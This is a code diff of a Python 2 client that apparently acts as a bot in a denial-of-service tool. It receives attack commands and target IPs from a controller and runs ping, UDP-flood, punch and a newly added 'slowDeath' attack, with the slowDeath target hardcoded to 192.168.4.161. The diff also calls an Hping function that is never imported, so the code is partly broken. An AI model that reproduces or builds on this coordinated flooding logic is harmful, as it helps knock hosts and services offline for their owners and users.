@@ -4,10 +4,11 @@ import sys
 import datetime
 import time
 import thread
-from slaveping import Ping
-from slavepunch import Punch
-from udpfld import Floodudp
-from slavetest import Test
+#from slaveping import Ping
+#from slavepunch import Punch
+#from udpfld import Floodudp
+#from slavetest import Test
+from slowDeath import main
 
 my_address = socket.gethostbyname(socket.gethostname())
 
@@ -15,9 +16,12 @@ ping = 'slaveping'
 punch = 'slavepunch'
 slaveudp = 'udp'
 test = 'slavetest'
+hping = 'slavehping'
+slowDeath = 'slowDeath'
 global ipAdd
 global numPing
 global srcAdd
+global threads
 #ipAdd = '198.252.11.72'
 srcAdd = 'localhost'
 numPing = 5
@@ -39,9 +43,10 @@ try:
 	#send data
 	#message = 'Client Hostname: ' + socket.gethostname()
 	#message = 'slavepunch'
-	message = 'slavetest'
+	#message = 'slavetest'
 	#message = 'slaveping'
 	#message = 'udp'
+	message = 'slowDeath'
 	print >>sys.stderr, '\nSending: "%s"\n' % message 
 	soc.sendall(message)
 	
@@ -66,6 +71,9 @@ try:
 	elif message == test:
 		ipAdd = soc.recv(1024)
 		Test(srcAdd, ipAdd)
+	elif message == hping:
+		ipAdd = soc.recv(1024)
+		Hping(srcAdd, ipAdd)
 	elif message == slaveudp:
 		ipAdd = soc.recv(1024)
 		numPing = soc.recv(1024)
@@ -80,6 +88,12 @@ try:
 						time.sleep(1)
 					time.sleep(1)
 			break
+	elif message == slowDeath:
+		ipAdd = soc.recv(1024)
+		ipAdd = '192.168.4.161'
+		#threads = soc.recv(1024)
+		main(ipAdd)
+		
 
 finally:
 	print >>sys.stderr, '\nClosing Socket'
